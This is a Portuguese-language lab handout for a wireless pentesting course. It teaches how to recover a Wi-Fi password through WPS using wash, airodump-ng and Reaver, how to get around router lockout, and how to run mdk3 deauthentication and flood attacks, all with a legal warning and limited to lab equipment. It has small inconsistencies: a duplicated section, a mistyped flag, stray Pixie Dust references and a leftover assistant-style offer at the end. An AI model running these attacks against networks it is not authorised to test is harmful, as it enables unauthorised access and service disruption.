# 📡 Aula 07 — Testes de Invasão Wireless: Quebra de Senha via WPS com Kali Linux

> **Módulo:** Redes Sem-Fio — Testes de Invasão (Pentest Wireless)
> **Aula:** 07 — Enumeração de APs com WPS Ativo e Ataque de PIN
> **Equipamentos homologados:** TP-Link Archer C50 (W) e TP-Link Archer EC220-G5 (configurados com **WPS habilitado** pelos alunos)
> **Estação de ataque:** Kali Linux + placa de rede wireless compatível com modo monitor/injeção
---

## ℹ️ Informações do Documento

| Campo | Descrição |
|---|---|
| **Autor** | Robson Vaamonde |
| **Data de criação** | 22/07/2026 |
| **Data de atualização** | 16/08/2026 |
| **Versão** | 0.02 |
| **Equipamentos testados** | Archer C50 (W) e Archer EC220-G5 |
---

### 🔗 Links do Autor

| Canal | Link |
|---|---|
| Procedimentos em TI | http://procedimentosemti.com.br |
| Bora para Prática | http://boraparapratica.com.br |
| Site pessoal | http://vaamonde.com.br |
| Facebook — Procedimentos em TI | https://www.facebook.com/ProcedimentosEmTi |
| Facebook — Bora para Prática | https://www.facebook.com/BoraParaPratica |
| Instagram — Procedimentos em TI | https://www.instagram.com/procedimentoem |
| YouTube — Bora para Prática | https://www.youtube.com/boraparapratica |
| LinkedIn — Robson Vaamonde | https://www.linkedin.com/in/robson-vaamonde-0b029028/ |
| GitHub — Procedimentos em TI | https://github.com/vaamonde |
---

## ⚠️ Aviso Legal e Ético — Leia Antes de Iniciar

> Este material é destinado **exclusivamente a fins didáticos**, em **ambiente de rede controlada e isolada** (laboratório), com equipamentos de propriedade da instituição de ensino e consentimento expresso para os testes.
>
> A utilização das técnicas aqui descritas contra redes de terceiros, sem autorização formal, configura crime previsto no **Código Penal Brasileiro** (arts. 154-A e 154-B — invasão de dispositivo informático; art. 266 — interrupção de serviço telemático; arts. 155 e 157 — subtração de coisa alheia), além de responsabilidade civil (Código Civil, arts. 927 a 943).
>
> Cada grupo deve atacar **somente** o Access Point que lhe foi atribuído no laboratório.
---

## 📑 Sumário

1. [Contextualização — Por que o WPS é o Elo Mais Fraco](#01---contextualização--por-que-o-wps-é-o-elo-mais-fraco)
2. [Preparação do Ambiente e Modo Monitor](#02---preparação-do-ambiente-e-modo-monitor)
3. [Enumeração de APs com WPS Ativo (Wash)](#03---enumeração-de-aps-com-wps-ativo-wash)
4. [Identificando o Método WPS Disponível](#04---identificando-o-método-wps-disponível-airodump-ng---wps)
5. [Ataque de PIN com Reaver](#05---ataque-de-pin-com-reaver)
6. [Contornando o Lockout do Roteador](#06---contornando-o-lockout-do-roteador-quando-locked--sim)
7. [Validação e Preenchimento do Relatório](#07---validação-e-preenchimento-do-relatório)
8. [Roteiro das Próximas Aulas — WPA / WPA2 / WPA3](#-roteiro-das-próximas-aulas--wpa--wpa2--wpa3)
---

## 01 - Contextualização — Por que o WPS é o Elo Mais Fraco

O **WPS (Wi-Fi Protected Setup)** foi criado para facilitar o pareamento de dispositivos sem a necessidade de digitar a senha completa da rede — bastando um PIN numérico (geralmente 8 dígitos) ou o botão físico do roteador (PBC).

| Fragilidade | Descrição |
|---|---|
| PIN dividido em dois blocos | O PIN de 8 dígitos é validado pelo AP em dois blocos separados (4 + 3 dígitos, o 8º é checksum), reduzindo drasticamente o espaço de busca em relação a um PIN de 8 dígitos único. |
| Sem limite de tentativas (em muitos firmwares) | Diversos equipamentos não implementam bloqueio (*lockout*) adequado após tentativas malsucedidas, permitindo força bruta prática do PIN. |
| Independe da complexidade da senha Wi-Fi | Mesmo que a senha da rede (WPA2) seja longa e complexa, o WPS aceita o PIN como caminho alternativo de autenticação — quebrando o PIN, a senha da rede é revelada. |
---

> 💡 **Por isso é considerado mais simples:** diferente do WPA/WPA2 (que depende de um bom dicionário) ou do WEP (que depende de volume de IVs), o ataque ao WPS explora uma falha de **design do protocolo**, não a força da senha em si.
---

## 02 - Preparação do Ambiente e Modo Monitor

### 🔧 Procedimento

```bash
# Verificar se a interface wireless foi reconhecida
sudo iwconfig

# Verificar detalhes da placa (fabricante/chipset)
sudo lsusb

# Verificar o status de processos de gerenciamento da Rede Sem-Fio
# opção do comando airmon-ng: check (List all possible programs that could interfere with the wireless card)
sudo airmon-ng check

# Finalizando os processos de gerenciamento da Rede Sem-Fio
# opções do comando airmon-ng: check (List all possible programs that could interfere with the wireless card), 
# kill (If 'kill' is specified, it will try to kill all of them)
sudo airmon-ng check kill

# Habilitar o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
# opção do comando airmon-ng: start (Enable  monitor  mode on an interface (and specify a channel))
sudo airmon-ng start wlan1

# Verificando o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
sudo iwconfig
```

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | `iwconfig` exibe `wlan1mon` com **Mode:Monitor**. |
| 2 | Nenhum processo do NetworkManager reaparece interferindo na interface. |
---

## 03 - Enumeração de APs com WPS Ativo (Wash)

O **wash** é a ferramenta tradicional da suíte Reaver para identificar quais redes ao redor possuem o WPS habilitado.

### 🔧 Procedimento

```bash
# Listando todas as Redes Sem-Fio com suporte ao WPS (QSS) habilitado
# opção do comando wash: -i (Set interface to capture packets on)
sudo wash -i wlan1mon

# Modo scan (recomendado) para analisar ao Redes Sem-Fio com suporte ao WPS (QSS)
# opções do comando wash: -i (Set interface to capture packets on), -s (Use scan mode)
sudo wash -i wlan1mon -s
```

| Campo | Descrição |
|---|---|
| `-i` | Interface em modo monitor a ser utilizada. |
| `-s` | Modo *scan* — varre continuamente os canais em busca de APs com WPS ativo. |
| **BSSID** | Endereço MAC do AP com WPS habilitado — necessário para os próximos comandos. |
| **Ch** | Canal em que o AP opera. |
| **Locked** | Indica se o WPS está bloqueado (*lockout*) no momento — se aparecer `Yes`/`sim`, o equipamento precisará ser reiniciado ou destravado (ver seção 06) antes do ataque de PIN. |
| **ESSID** | Nome da rede (SSID) do AP. |
---

> ⚠️ **Atenção:** anote o BSSID e o canal do AP do grupo antes de prosseguir, e confirme que o campo **Locked** está como `No`/`não`.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | O AP do grupo aparece na listagem do `wash` com WPS habilitado. |
| 2 | Campo **Locked** confirmado como `No` antes de iniciar o ataque de PIN. |
---

## 04 - Identificando o Método WPS Disponível (`airodump-ng --wps`)

### 🔧 Procedimento

```bash
# Escaneamento da rede utilizando o Airodump-NG em busca de Access Point com suporte ao WPS (QSS)
# opção do comando airodump-ng: --wps (Display a WPS column with WPS version, config method(s))
sudo airodump-ng --wps wlan1mon

# Filtrando i Access Point com suporte ao WPS (QSS) com base no BSSID
# opção do comando airodump-ng: -c ( Indicates the frequencies to listen to), --bssid (t will only show 
# networks, matching the given bssid),--wps (Display a WPS column with WPS version, config method(s))
sudo airodump-ng -c <CANAL> -bssid <BSSID_DO_AP_WPS> --wps wlan1mon
```

| Método | Descrição |
|---|---|
| **Ether** | Ativação do WPS realizada pela interface Ethernet do equipamento. |
| **LAB** | *Label* — PIN fixo impresso na etiqueta do dispositivo (mais previsível/fraco). |
| **PBC** | *Push Button Configuration* — ativado pelo botão físico do roteador. |
| **DISP** | Ativado via display do dispositivo, exibindo um PIN dinâmico. |
---

> 💡 Essa etapa é opcional, mas ajuda a entender **como** o WPS foi implementado no equipamento-alvo antes de partir para o ataque de força bruta do PIN.
---

## 05 - Ataque de PIN com Reaver

Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o ataque de força bruta ao PIN.

### 🔧 Procedimento — Método Tradicional

```bash
# Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado
# opções do comando reaver: -i (Name of the monitor-mode interface to use), -b (BSSID of the target AP), 
# -c (Set the 802.11 channel for the interface), -vv (Display non-critical warnings for more)
sudo reaver -i wlan1mon -b <BSSID_DO_AP> -c <CANAL> -vv
```

| Parâmetro | Descrição |
|---|---|
| `-i` | Interface em modo monitor. |
| `-b` | BSSID do AP-alvo, obtido no passo 03. |
| `-c` | Canal utilizado pelo BSSID Ap-Alvo |
| `-vv` | Modo *verbose* — exibe o progresso detalhado em tempo real. |
---

> **OBSERVAÇÃO IMPORTANTE:** Expectativa de tempo: o ataque online completo pode levar de `2 a 10+ horas`, já que testa até `~11.000 combinações reais` contra o roteador (bem diferente do Pixie Dust, que é quase instantâneo quando funciona).

### ✅ Resultado Esperado

| Situação | Ação |
|---|---|
| ✅ `WPS PIN: 'XXXXXXXX'` / `WPA PSK: 'senha'` | Ataque bem-sucedido — anotar PIN e senha no relatório do grupo. |
| ❌ `WPS transaction failed` repetidas vezes | O chipset pode não ser vulnerável ao Pixie Dust — seguir para o método tradicional com pausa (`-d`), abaixo. |
---

# 05 - Ataque de PIN Conhecido com Reaver 

Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o ataque de PIN conhecido para descobrir a senha WPA/WPA2.

### 🔧 Procedimento — Método Tradicional

```bash
# Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado
# opções do comando reaver: -i (Name of the monitor-mode interface to use), -b (BSSID of the target AP), 
# -c (Set the 802.11 channel for the interface), -p (Use the specified WPS pin), -vv (Display non-critical
# warnings for more)
sudo reaver -i wlan1mon -b <BSSID_DO_AP> -c <CANAL> -p <NÚMERO_DO_PIN> -vv
```

| Parâmetro | Descrição |
|---|---|
| `-i` | Interface em modo monitor. |
| `-b` | BSSID do AP-alvo, obtido no passo 03. |
| `-c` | Canal utilizado pelo BSSID Ap-Alvo |
| `-p` | Número do PIN conhecido do BSSID Ap-Alvo |
| `-vv` | Modo *verbose* — exibe o progresso detalhado em tempo real. |
---

> **OBSERVAÇÃO IMPORTANTE:** Com o número do PIN conhecido o ataque de descoberta de senha e quase instantâneo em roteadores vulnerável.

### ✅ Resultado Esperado

| Situação | Ação |
|---|---|
| ✅ `WPS PIN: 'XXXXXXXX'` / `WPA PSK: 'senha'` | Ataque bem-sucedido — anotar PIN e senha no relatório do grupo. |
| ❌ `WPS transaction failed` repetidas vezes | O chipset pode não ser vulnerável ao Pixie Dust — seguir para o método tradicional com pausa (`-d`), abaixo. |
---

## 06 - Contornando o Lockout do Roteador (quando `Locked = Sim`)

Se o ataque anterior falhar continuamente ou o AP entrar em bloqueio (*lockout*), utilize um tempo de pausa entre as tentativas para reduzir a chance de travamento — mais lento, porém mais seguro:

```bash
# Contornando o Lockout (Travamento) do Roteador com suporte ao Locked Yes
sudo reaver -i wlan1mon -b <BSSID_DO_AP> -K 1 -d 302 -vv
```

| Parâmetro | Descrição |
|---|---|
| `-d 302` | Insere uma pausa de 302 milissegundos entre as tentativas de PIN, evitando disparar o mecanismo de proteção (*lockout*) do roteador. Método mais demorado, porém mais estável. |
---

### 🔓 Se o roteador já travou (Locked = Sim)

Alguns firmwares só resetam o estado do WPS após uma queda de conexão/reinício. Uma alternativa didática (avançada, opcional) para forçar esse reset em laboratório é usar o **mdk3** para gerar desautenticação/flood controlado contra o próprio AP do grupo, forçando-o a reiniciar seu estado interno:

```bash
# Terminal 1 — ataque de autenticação
sudo mdk3 wlan1mon a -a <BSSID_DO_AP>

# Terminal 2 — flood de desautenticação direcionado à rede
sudo mdk3 wlan1mon x -t <BSSID_DO_AP> -n <ESSID_DO_AP> -s 200

# Terminal 3 — ataque de beacon flood
sudo mdk3 wlan1mon b -t <BSSID_DO_AP>
```

> ⚠️ **Uso restrito ao laboratório:** este procedimento gera ruído significativo na rede e deve ser aplicado **apenas** contra o AP do próprio grupo, nunca em produção ou contra equipamentos de terceiros — o objetivo é puramente didático, para observar o comportamento de proteção do firmware.

Após alguns instantes, confirme o destravamento consultando novamente:

```bash
sudo wash -i wlan1mon
```

O campo **Locked** deve voltar a `No`, permitindo repetir o ataque de PIN do passo 05.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | Reaver retorna o PIN WPS e a senha WPA/WPA2 da rede. |
| 2 | Em caso de lockout, o campo `Locked` do `wash` retorna a `No` após o procedimento de destravamento. |
---

## 07 - Validação e Preenchimento do Relatório

### ✅ Testes de Validação Final

| # | Teste |
|---|---|
| 1 | Conectar um dispositivo à rede do grupo usando a senha (PSK) revelada pelo Reaver, confirmando o acesso. |
| 2 | Registrar no relatório: BSSID, ESSID, canal, PIN WPS encontrado, senha revelada e tempo total do ataque. |
| 3 | Discutir em grupo: por que desabilitar o WPS (como feito na Aula 04, item 03) é uma das medidas de segurança mais recomendadas, mesmo em redes com senha WPA2/WPA3 forte. |
---

## ✅ Checklist Final da Aula

- [ ] Modo monitor habilitado (`wlan1mon`)
- [ ] APs com WPS ativo enumerados via `wash -i wlan1mon -s`
- [ ] BSSID, canal e status `Locked` do AP-alvo confirmados
- [ ] Método WPS identificado (opcional) via `airodump-ng --wps`
- [ ] Ataque de PIN executado com `reaver` (Pixie Dust `-K 1` e/ou `-P`)
- [ ] Em caso de falha/lockout, pausa `-d 302` aplicada ou destravamento via `mdk3` realizado
- [ ] PIN WPS e senha (PSK) obtidos com sucesso
- [ ] Conexão validada com a senha descoberta
- [ ] Relatório do grupo preenchido com BSSID, PIN, senha e tempo de ataque
---

## 🗺️ Roteiro das Próximas Aulas — WPA / WPA2 / WPA3

| Aula | Protocolo | Técnica principal | Ferramentas |
|---|---|---|---|
| **08** | WPA / WPA2-Personal | Captura de **4-way handshake** (passiva ou via desautenticação ativa com `aireplay-ng -0`) + ataque de **força bruta por dicionário** — sem atalho estatístico como no WEP | `airmon-ng`, `airodump-ng`, `aireplay-ng -0`, `aircrack-ng -w wordlist.txt`, `crunch` (geração de wordlist customizada), opcionalmente `pyrit`/`hashcat` (aceleração por GPU) |
| **08b** *(complementar)* | WPA / WPA2 via PMKID | Ataque que dispensa a captura de handshake completo em alguns APs, extraindo o PMKID diretamente do primeiro pacote EAPOL | `hcxdumptools`, `hcxtools` (`hcxpcaptool`), `hashcat -m 16800` |
| **09** | WPA3-Personal (SAE) | Explicar por que o handshake tradicional **não é suficiente** contra SAE/Dragonfly (resistente a ataques offline de dicionário); abordar vetores residuais (downgrade para WPA2 em modo misto, side-channel) | Discussão teórica + testes em modo misto WPA2/WPA3 |
---

> 💡 **Observação didática:** assim que você fornecer o arquivo com o banco de senhas sorteadas por grupo, posso ajudar a estruturar a wordlist (`.txt`) no formato esperado pelo `aircrack-ng -w` e pelo `hashcat`, já preparando o material da Aula 08.

> 📌 **Próxima aula:** Aula 08 — Captura de handshake e quebra de senha WPA/WPA2 via dicionário.
